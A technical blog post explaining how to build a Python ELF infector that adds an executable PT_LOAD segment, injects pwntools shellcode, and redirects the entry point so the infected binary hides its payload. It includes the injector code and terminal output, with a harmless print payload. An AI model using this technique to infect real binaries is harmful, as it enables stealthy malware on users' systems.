---
layout: post
title: PT_LOAD Injection with Python
date: 2022-11-27 13:20:14 +0300
description: Let's create a injector that use PT_LOAD injection technique
author: Utku Çorbacı - @rhotav
comments: true
tags: [Coding, Python, ELF, Linux, EN]
---

Twitter: [@rhotav](https://twitter.com/rhotav)

In this blog post, I'll explain how to create a injector that use PT_LOAD injection technique with Python. I'll use LIEF Python Library in this code.

# Table Of Contents
<pre>
1. ELF Basics
    1.1 PT_LOAD
2. Algorithm Of Technique
    2.1 Algorithm
3. Creating Injector
4. References
</pre>

# ELF Basics
## PT_LOAD
Actually, what I want to tell you here is what PT_LOAD is. According to Oracle Docs:
> Specifies a loadable segment, described by p_filesz and p_memsz. The bytes from the file are mapped to the beginning of the memory segment. If the segment's memory size (p_memsz) is larger than the file size (p_filesz), the extra bytes are defined to hold the value 0 and to follow the segment's initialized area. The file size can not be larger than the memory size. Loadable segment entries in the program header table appear in ascending order, sorted on the p_vaddr member.

This type (PT_LOAD) of program header is describing a loadable segment, which means that the segment is going to be loaded or mapped into memory. 
For instance, an ELF executable will generally contain the two loadable segments (of type PT_LOAD):
1. The text segment for program code
2. And the data segment for global variables and dynamic linking information

# Algorithm Of Technique
Our injector, create a new LOAD segment in to be injected. Let's look output of readelf for injected file.
```
➜  ~ readelf -l test_infected

Elf file type is EXEC (Executable file)
Entry point 0x10004000
There are 12 program headers, starting at offset 8396

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x0020cc 0x0804a0cc 0x0804a0cc 0x00e40 0x00e40 R   0x4
  INTERP         0x000194 0x08048194 0x08048194 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00324 0x00324 R   0x1000
  LOAD           0x001000 0x08049000 0x08049000 0x001cc 0x001cc R E 0x1000
  LOAD           0x002000 0x0804a000 0x0804a000 0x00f0c 0x00f0c R   0x1000
  LOAD           0x002f0c 0x0804bf0c 0x0804bf0c 0x00114 0x00118 RW  0x1000
  LOAD           0x004000 0x10004000 0x10004000 0x01000 0x01000   E 0x999
  DYNAMIC        0x002f14 0x0804bf14 0x0804bf14 0x000c0 0x000c0 RW  0x4
  NOTE           0x0001a8 0x080481a8 0x080481a8 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x002014 0x0804a014 0x0804a014 0x0002c 0x0002c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x002f0c 0x0804bf0c 0x0804bf0c 0x000f4 0x000f4 R   0x1
```

We are seeing a LOAD segment more different than other LOAD segments. If you read the source code, you will see that the segment with `VirtAddr = 0x999` is the segment containing the malicious shellcode.

## Algorithm
1. Parse to be infected file
2. Create a new LOAD segment
3. Inject shellcode to created segment
4. Patch binary entrypoint
5. Add the old entrypoint at the end of Shellcode. (The main reason for doing this is that if we are trying to remain anonymous, the infected file will run without revealing anything to the user.)
6. Save new binary

# Creating Injector
The first library we'll use to build the injector is [lief](https://lief-project.github.io/), so I'll talk about it a bit. A library that parses executable files (ELF, PE, MACH-O). The first function we will use in our script is lief.parse(). Parse the target file and load it with all the details into the variable we want. Moreover, we can create a new segment with the Segment class.
```python

payload = "this must be rhotav!\n"
binary = lief.parse(args.f)
shellcode = asm("mov esi, edx")
shellcode += asm(shellcraft.i386.write(1, payload, len(payload)))
shellcode += asm(f"""
mov edx, esi
push {hex(binary.header.entrypoint)}
ret
""")
segment           = lief.ELF.Segment()
segment           = lief.ELF.Segment()
segment.type      = lief.ELF.SEGMENT_TYPES.LOAD
segment.flags     = lief.ELF.SEGMENT_FLAGS.X
segment.content   = bytearray(shellcode)
segment.alignment = 0x999
binary.add(segment)
```
The asm function in the library we use to generate shellcode (i.e. pwntools) is used to convert what we write in assembly language into a bytearray.
Here I have chosen to print a message on the screen, but you can do something different (remember to organize the memory properly according to the error you will get!)

Output:

```
➜  ~ ./test
Infect Me !
➜  ~ python3 main.py -f ./test
Shellcode size:  53
[+] Segment added
[+] Real EntryPoint:  0x8049070
[+] New EntryPoint:  0x10004000
➜  ~ ls
main.py  test  test.c  test_infected
➜  ~ chmod +x test_infected
➜  ~ ./test_infected
this must be rhotav!
Infect Me !
```

Source Code: [GitHub Repo](https://github.com/rhotav/PT_LOAD-Injector)

# References
- [tmpout](https://tmpout.sh/1/3.html)
- [packtpub](https://subscription.packtpub.com/book/networking-and-servers/9781782167105/4/ch04lvl1sec36/the-pt_note-to-pt_load-conversion-infection-method)


"This must be rhotav!"